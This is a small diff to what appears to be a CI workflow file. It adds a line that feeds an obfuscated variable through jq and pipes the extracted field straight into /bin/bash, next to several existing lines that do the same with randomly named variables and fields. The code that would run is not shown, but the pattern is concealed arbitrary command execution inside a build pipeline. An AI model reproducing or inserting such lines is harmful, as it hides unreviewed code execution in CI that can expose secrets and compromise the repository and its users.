@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$d90511" | jq -r .ntnrf1 | /bin/bash
           printf '%s' "$zyqg57972" | jq -r .gge5098 | /bin/bash
           echo $guysz7956 | jq -r .ulpq94634 | /bin/bash
+          printf '%s' "$u7" | jq -r .gsit42 | /bin/bash
 
       - name: Persist results
         if: always()
